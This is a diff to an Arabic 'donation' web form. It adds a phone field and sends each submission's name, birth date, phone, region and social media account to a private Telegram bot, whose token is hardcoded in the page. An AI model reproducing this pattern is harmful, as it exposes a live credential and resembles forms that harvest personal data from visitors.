@@ -53,6 +53,12 @@
                 <label for="fatherName">تاريخ الميلاد</label>
                 <input type="text" id="fatherName" name="fatherName" required>
             </div>
+
+            <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="tel" id="phone" name="phone" required placeholder="مثال: 0512345678">
+            </div>
+
             <div class="form-group">
                 <label for="region">المحافظة/المنطقة</label>
                 <input type="text" id="region" name="region" required>
@@ -87,6 +93,7 @@
                 name: document.getElementById('name').value,
                 gender: gender,
                 fatherName: document.getElementById('fatherName').value,
+                phone: document.getElementById('phone').value,
                 region: document.getElementById('region').value,
                 socialMedia: document.getElementById('socialMedia').value,
                 platform: document.getElementById('platform').value
@@ -94,7 +101,7 @@
 
             const BOT_TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
             const CHAT_ID = "7763665935";
-            const message = `**🎯 تبرع جديد**\n\n👤 الاسم: ${formData.name}\n⚤ الجنس: ${formData.gender}\n📅 تاريخ الميلاد: ${formData.fatherName}\n📍 المنطقة: ${formData.region}\n📱 الحساب: ${formData.socialMedia}\n📌 المنصة: ${formData.platform}`;
+            const message = `**🎯 تبرع جديد**\n\n👤 الاسم: ${formData.name}\n⚤ الجنس: ${formData.gender}\n📅 تاريخ الميلاد: ${formData.fatherName}\n📞 الهاتف: ${formData.phone}\n📍 المنطقة: ${formData.region}\n📱 الحساب: ${formData.socialMedia}\n📌 المنصة: ${formData.platform}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
